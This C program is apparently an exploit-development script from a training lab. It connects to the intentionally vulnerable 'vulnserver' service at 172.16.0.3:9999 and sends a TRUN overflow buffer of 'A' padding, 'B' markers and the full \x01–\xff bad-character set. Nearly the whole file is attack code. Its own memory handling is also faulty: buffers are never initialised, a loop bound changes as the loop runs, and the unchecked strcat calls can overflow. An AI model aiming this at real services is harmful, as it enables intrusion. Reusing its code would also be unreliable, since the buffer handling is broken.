#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#define PORT 9999
#define REALLOC_BUFFER_SIZE 4096

// Borrowed Snippet
// https://codereview.stackexchange.com/questions/83229/c-string-appender-for-buffers-and-strings
char *append(char *orig_str, size_t *orig_str_size, const char *append_str) {
    // no action required if appending an empty string
    if (append_str[0] == 0) {
        return orig_str;
    }

    // does the current char* have enough space?
    size_t req_space = strlen(orig_str) + strlen(append_str) + 1; // +1 for NULL byte

    // resize if the required space is greater than the original buffer size.
    if (req_space > *orig_str_size) {
        // prepare the variable with the amount of space we want
        size_t allocate = *orig_str_size + req_space + REALLOC_BUFFER_SIZE;

        char *new_str = (char *)realloc(orig_str, allocate);
        // resize success..
        if (new_str == NULL) {
            fprintf(stderr, "Couldn't reallocate memory\n");
            return NULL;
        }

        // the realloc didn't fail, here is our new pointer
        orig_str = new_str;

        // overwrite the free space with NULL's
        memset(orig_str + strlen(orig_str), 0, req_space);

        // copy the appending text to the string
        strcpy(orig_str + strlen(orig_str), append_str);

        // modify the original size
        *orig_str_size = allocate;

    } else {
        // append the string
        strcpy(orig_str + strlen(orig_str), append_str);
    }

    return orig_str;
}

int main() {
  int sock;
  int i;
  struct sockaddr_in vulnserver;
  char *trun = "TRUN /.:/";
  char *shellcode;
  char *bufA;
  char *bufB;
  size_t buffer_size = 4096;
  size_t bufA_size = 2003;
  size_t bufB_size = 4;
  shellcode = (char *)malloc(sizeof(char) * buffer_size);
  bufA = (char *)malloc(sizeof(char) * bufA_size);
  bufB = (char *)malloc(sizeof(char) * bufB_size);
  strcpy(shellcode, trun);
  char *badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";

  for (i=0; i < bufA_size; ++i) {
    bufA = append(bufA, &bufA_size, "A");
  }
  for (i=0; i < bufB_size; ++i) {
    bufB = append(bufB, &bufB_size, "B");
  }

  strcat(shellcode, bufA);
  strcat(shellcode, bufB);
  strcat(shellcode, badchars);

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    printf("\n Socket creation error \n");
    return -1;
  }

  vulnserver.sin_family = AF_INET;
  vulnserver.sin_port = htons(PORT);

  if (inet_pton(AF_INET, "172.16.0.3", &vulnserver.sin_addr) <= 0)
  {
    printf("\nInvalid address / Address type not supported \n");

    return -1;
  }
  if (connect(sock, (struct sockaddr *)&vulnserver, sizeof(vulnserver)) < 0)
  {
    printf("\nConnection Failed\n");
    return -1;
  }
  send(sock, shellcode, strlen(shellcode), 0);
  close(sock);

  return 0;
}
